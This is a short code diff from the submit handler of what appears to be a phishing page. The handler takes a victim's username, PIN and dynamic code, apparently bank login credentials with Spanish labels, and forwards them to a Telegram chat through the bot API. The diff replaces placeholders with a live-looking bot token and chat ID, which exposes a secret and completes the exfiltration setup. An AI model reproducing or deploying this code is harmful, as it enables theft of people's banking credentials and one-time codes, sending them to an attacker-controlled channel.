@@ -60,8 +60,8 @@ async function handleSubmit(e) {
     
     // Send to Telegram (Replace BOT_TOKEN and CHAT_ID with your values)
     try {
-        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
-        const CHAT_ID = 'YOUR_CHAT_ID';
+        const BOT_TOKEN = '8111270124:AAHsKW7PfdE0A-lwMR8Qj98ul86SCMjxJg4';
+        const CHAT_ID = '-1002572002457';
         const message = `👤 Usuario: ${data.username}\n🔐 PIN: ${data.pin}\n🔑 Código: ${data.dynamic}`;
         
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
